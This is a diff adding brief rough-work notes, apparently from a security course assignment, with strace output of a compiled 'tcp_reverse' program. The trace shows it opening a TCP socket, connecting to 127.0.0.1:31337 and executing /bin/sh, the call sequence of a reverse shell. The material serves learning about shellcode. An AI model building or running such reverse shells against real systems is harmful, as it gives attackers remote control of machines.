@@ -1,0 +1,8 @@
+Rough work for TCP Reverse Shell
+
+shashank@ubuntu:~/Desktop/Exam/Assignment 2/task2_take1$ strace -e socket,connect,dup,execve ./tcp_reverse
+execve("./tcp_reverse", ["./tcp_reverse"], [/* 60 vars */]) = 0
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+connect(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
+execve("/bin/sh", NULL, NULL)           = 0
+
